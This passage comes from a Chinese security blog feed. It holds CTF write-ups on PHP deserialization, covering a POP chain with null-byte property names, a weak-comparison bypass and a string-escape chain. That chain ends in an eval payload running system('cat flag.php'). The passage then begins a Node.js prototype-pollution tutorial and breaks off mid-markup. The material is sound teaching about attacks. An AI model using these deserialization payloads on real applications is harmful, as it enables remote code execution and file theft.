class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line">$w22 = new w22m();</span><br><span class="line">$w33 = new w33m();</span><br><span class="line">$w44 = new w44m();</span><br><span class="line">$w22-&gt;w00m = $w33;</span><br><span class="line">$w33-&gt;w00m = $w44;</span><br><span class="line">$w33-&gt;w22m = &#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($w22);</span><br><span class="line"></span><br><span class="line">// O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot; w44m admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot; * passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br><span class="line">// 将上述字符串中的特殊字符化成%00</span><br></pre></td></tr></table></figure></p><p>最终payload：</p><p><code>?w00m=O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:4:&quot;w44m&quot;;s:9:&quot;%00*%00passwd&quot;;s:5:&quot;08067&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</code></p><h1 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">username <span class="keyword">or</span> password error!</span><br></pre></td></tr></table></figure><p>题目要求GET传入一个info，并对info做反序列化，使得反序列化后的数组中，对应的<code>$data_unserialize[&#39;username&#39;]==$username&amp;&amp;$data_unserialize[&#39;password&#39;]==$password</code></p><p><strong>注意：第五行注释提示改变了两个变量的值，所以需要进行弱比较绕过</strong></p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>=&gt;<span class="number">0</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br></pre></td></tr></table></figure><p>最终payload：</p><p><code>?info=a:2:&#123;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;</code></p><h1 id="UUCTF-2022-新生赛-ezpop"><a href="#UUCTF-2022-新生赛-ezpop" class="headerlink" title="[UUCTF 2022 新生赛]ezpop"></a>[UUCTF 2022 新生赛]ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pdata</span>=<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看代码，发现反序列化的条件是先进行字符串替换，再反序列化，不难看出，这里可以进行字符串逃逸，而且还是比较简单的字符串增加</p><p>先梳理一下调用顺序</p><ul><li>在<code>youwant</code>类中存在任意命令执行的条件</li><li>在<code>output</code>类中发现可以利用<code>__toString()</code>魔术方法来间接调用<code>youwant</code>类中的<code>rce()</code>函数</li><li>可以通过<code>nothing</code>类中的<code>__destruct()</code>魔术方法里面的<code>die()</code>函数触发<code>__toString()</code>方法</li></ul><p>至此，调用顺序就出来了：</p><p><code>nothing-&gt;output-&gt;youwant</code></p><p>还有几个问题需要我们解决：</p><ol><li>如何触发<code>nothing</code>类中的<code>__destruct()</code>魔术方法？</li><li>在<code>nothing</code>类中，如何避免<code>a</code>变量被<code>__wakeup()</code>魔术方法替换为空？</li><li>又该怎么利用字符串逃逸呢？</li></ol><p>解决方案：</p><ol><li>在<code>UUCTF</code>类中当<code>key=&quot;UUCTF&quot;</code>时，可以进行一次反序列化操作，进而触发<code>__destruct()</code></li><li>可以利用引用，通过引用变量<code>a</code>和<code>b</code>，当赋值给<code>t</code>的时候就可以给<code>a</code>赋值了</li><li>使<code>key=&quot;UUCTF&quot;</code>时以及给<code>basedata</code>赋值时，可以利用字符串逃逸</li></ol><p>最终调用顺序：</p><p><code>UUCTF-&gt;nothing-&gt;output-&gt;youwant</code></p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$out</span> = <span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$no</span> = <span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$you</span> = <span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$no</span>-&gt;a =&amp; <span class="variable">$no</span>-&gt;b;</span><br><span class="line"><span class="variable">$no</span>-&gt;t = <span class="variable">$out</span>;</span><br><span class="line"><span class="variable">$out</span>-&gt;a = <span class="variable">$you</span>;</span><br><span class="line"><span class="variable">$you</span>-&gt;cmd = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$no</span>));<span class="comment">// basedata数据需要逃逸的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEwOiJwaHBpbmZvKCk7Ijt9fX0=</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>拼凑要逃逸的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;s:160:&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEwOiJwaHBpbmZvKCk7Ijt9fX0=&quot;;s:2:&quot;ob&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 查询长度为220</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">220</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="comment">// 生成数量一致的hacker用来字符串逃逸</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将上面两个字符串拼接</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;s:160:&quot;Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjEwOiJwaHBpbmZvKCk7Ijt9fX0=&quot;;s:2:&quot;ob&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>执行成功，页面显示phpinfo页面，通过更改cmd的值，重复上述操作，即可获得flag</p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:3:&quot;</span>key<span class="string">&quot;;s:5:&quot;</span>UUCTF<span class="string">&quot;;s:8:&quot;</span>basedata<span class="string">&quot;;s:176:&quot;</span>Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oJ2NhdCBmbGFnLnBocCcpOyI7fX19<span class="string">&quot;;s:2:&quot;</span>ob<span class="string">&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>查看源码，得到flag</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs原型链污染</title>
      <link href="/2023/08/03/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2023/08/03/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Nodejs基础"><a href="#Nodejs基础" class="headerlink" title="Nodejs基础"></a>Nodejs基础</h1><blockquote><p>简单的说 Node.js 就是运行在服务端的 JavaScript。<br>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。<br>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</p><p>node.js 允许用户从NPM服务器下载别人编写的第三方包到本地使用</p></blockquote><p>这就像python 一样pip下载包以后，通过import引入，而node.js是通过require引入的</p><h2 id="类与构造函数-constructor"><a href="#类与构造函数-constructor" class="headerlink" title="类与构造函数(constructor)"></a>类与构造函数(constructor)</h2><p>JavaScript中，我们如果要定义一个类，需要以<strong>定义“构造函数”的方式</strong>来定义： </p><p> 一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部： </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure><p>如上段代码：<code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。 </p><p> 这段代码功能就是 定义一个Foo类，调用Foo类的show方法，会输出它的 bar 属性</p><h2 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h2><blockquote><p>Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。<br>异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。</p></blockquote><p>解释同步和异步：</p><ul><li>当你先读取文件，输出其内容后，又输出一段话的时候</li><li>同步：先输出文件内容，再输出一段话</li><li>异步：先输出一段话，后输出文件内容</li></ul><h2 id="fs模块"><a href="#fs模块" class="headerlink" title="fs模块"></a>fs模块</h2><p>node.js的文件操作模块，我们本地建立一个test.txt，内容为123456</p><p>它的同步函数：<code>readFileSync</code>，异步函数：<code>readFile</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 异步读取</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;sd.txt&#x27;</span>, <span class="keyword">function</span> (<span class="params">err, data</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (err) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;异步读取: &quot;</span> + data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同步读取</span></span><br><span class="line"><span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;test.txt&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;同步读取: &quot;</span> + data.<span class="title function_">toString</span>());</span><br><span class="line"> </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;程序执行完毕。&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">同步读取: 123456</span></span><br><span class="line"><span class="comment">程序执行完毕。</span></span><br><span class="line"><span class="comment">异步读取: 123456</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="child-process模块"><a href="#child-process模块" class="headerlink" title="child_process模块"></a>child_process模块</h2><p><code>child_process</code>提供了几种创建子进程的方式</p><blockquote><p>异步方式：spawn、exec、execFile、fork<br>同步方式：spawnSync、execSync、execFileSync<br>在异步创建进程时，spawn是基础，其他的fork、exec、execFile都是基于spawn来生成的。<br>同步创建进程可以使用child_process.spawnSync()、child_process.execSync() 和 child_process.execFileSync() ，同步的方法会阻塞 Node.js 事件循环、暂停任何其他代码的执行，直到子进程退出。</p></blockquote><p>其中的一些函数，在一些情况下，可以导致命令执行漏洞，</p><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h2><p>在JavaScript中，prototype对象是实现面向对象的一个重要机制。</p><p>它是函数所独有的，它是从一个函数指向一个对象</p><p>它的含义是函数的原型对象，也就是构造函数(constructor)所创建的实例的原型对象</p><p>生成实例化对象时，如果自己没有的属性prototype有，就会继承此属性，有的话则不会覆盖。</p><p>例如看下面这段js代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure></p><p>可一看到，我们可以通过prototype属性，指向到这个函数的<strong>原型对象中</strong>然后创建一个<code>show()</code>函数，功能为输出<code>this.bar</code></p><blockquote><p>我们可以认为原型 prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，</p><p>包括变量和方法。比如上图中的foo对象，其天生就具有foo.show()方法。</p></blockquote><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a>__proto__</h2><blockquote><p> 如上面所说，我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。</p></blockquote><p>不同于prototype是函数特有的，它是<strong>对象所独有的</strong>，<strong>proto</strong>属性都是由<strong>一个对象指向一个对象</strong>，</p><p><strong>即指向它们的原型对象（也可以理解为父对象）</strong></p><blockquote><p>一个Foo类实例化出来的foo对象，可以通过foo.<strong>proto</strong>属性来访问Foo类的原型，也就是说：</p><p><code>foo.__proto__ === Foo.prototype (True)</code></p><p>即：</p><p>prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法。</p><p>一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性</p></blockquote><h2 id="prototype与-proto-的关系"><a href="#prototype与-proto-的关系" class="headerlink" title="prototype与__proto__的关系"></a>prototype与__proto__的关系</h2><p><img src="/img/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/nodejs_03.png" alt=""></p><h2 id="原型链的继承思想"><a 